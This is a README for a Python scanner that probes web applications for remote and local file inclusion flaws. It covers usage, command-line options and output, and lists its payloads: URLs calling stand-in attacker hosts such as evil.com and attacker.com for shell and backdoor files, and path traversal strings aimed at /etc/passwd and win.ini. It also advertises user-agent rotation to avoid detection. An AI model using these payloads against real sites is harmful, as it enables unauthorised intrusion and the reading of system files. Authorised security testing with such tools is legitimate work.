# Modern RFI/LFI Scanner

A modernized, educational security tool for detecting Remote File Inclusion (RFI) and Local File Inclusion (LFI) vulnerabilities in web applications.

## ⚠️ IMPORTANT WARNING

**This tool is for EDUCATIONAL PURPOSES ONLY. It should only be used on systems you own or have explicit written permission to test. Unauthorized scanning of systems is illegal in many jurisdictions and may result in criminal charges.**

## Features

- **Modern Python Implementation**: Written in Python 3.8+ with async/await for better performance
- **Multiple Scan Types**: Supports both RFI and LFI vulnerability scanning
- **Concurrent Scanning**: Configurable concurrent connections for faster scanning
- **Comprehensive Reporting**: JSON and text-based reports with detailed vulnerability information
- **User Agent Rotation**: Built-in user agent rotation to avoid detection
- **Error Handling**: Robust error handling and logging
- **Rate Limiting**: Built-in rate limiting to avoid overwhelming target servers

## Installation

1. **Clone or download the repository**
2. **Install Python dependencies**:
   ```bash
   pip install -r requirements.txt
   ```

## Usage

### Basic Usage

```bash
# Scan a single URL for RFI vulnerabilities
python modern_rfi_scanner.py --url "http://example.com/page.php?id=" --type rfi

# Scan a single URL for LFI vulnerabilities
python modern_rfi_scanner.py --url "http://example.com/page.php?file=" --type lfi

# Scan multiple targets from a file
python modern_rfi_scanner.py --targets targets.txt --type rfi
```

### Advanced Usage

```bash
# Scan with custom settings
python modern_rfi_scanner.py \
    --targets targets.txt \
    --type rfi \
    --concurrent 20 \
    --timeout 15 \
    --output results.json \
    --verbose
```

### Command Line Options

- `--targets FILE`: File containing target URLs (one per line)
- `--url URL`: Single target URL to scan
- `--type {rfi,lfi}`: Type of vulnerability to scan for (default: rfi)
- `--concurrent N`: Maximum concurrent connections (default: 10)
- `--timeout N`: Request timeout in seconds (default: 10)
- `--output FILE`: Output file for results (default: scan_results.json)
- `--verbose, -v`: Enable verbose output
- `--help, -h`: Show help message

## Input File Format

Create a text file with target URLs, one per line:

```
http://example1.com/page.php?id=
http://example2.com/index.php?page=
http://example3.com/view.php?file=
```

## Output

The scanner generates two types of output:

1. **JSON Report** (`scan_results.json`): Machine-readable format with detailed scan results
2. **Console Output**: Human-readable summary and vulnerable targets

### Sample JSON Output

```json
{
  "scan_summary": {
    "total_scanned": 50,
    "vulnerable_found": 3,
    "scan_type": "RFI/LFI",
    "timestamp": "2024-01-15 14:30:25"
  },
  "vulnerable_targets": [
    {
      "url": "http://example.com/page.php?id=http://evil.com/shell.txt?",
      "payload": "http://evil.com/shell.txt?",
      "response_code": 200,
      "response_preview": "root:x:0:0:root:/root:/bin/bash...",
      "scan_time": 1.23
    }
  ]
}
```

## Security Considerations

### For Users
- Only scan systems you own or have explicit permission to test
- Be aware of local laws regarding security testing
- Use responsibly and ethically
- Consider the impact on target systems

### For System Administrators
- Implement proper input validation
- Use allowlists for file inclusion
- Enable security headers
- Regular security audits
- Monitor for suspicious activity

## Technical Details

### RFI Detection
The scanner tests for RFI vulnerabilities by:
1. Injecting remote URLs as parameters
2. Checking responses for common indicators
3. Analyzing response patterns and content

### LFI Detection
The scanner tests for LFI vulnerabilities by:
1. Injecting path traversal sequences
2. Attempting to access system files
3. Checking for sensitive file content in responses

### Payloads Used

**RFI Payloads:**
- `http://evil.com/shell.txt?`
- `http://attacker.com/backdoor.php?`
- `http://malicious.com/exploit.txt?`

**LFI Payloads:**
- `/../../../../../../../../etc/passwd`
- `/../../../../../../../../windows/win.ini`
- `/../../../../../../../../etc/hosts`
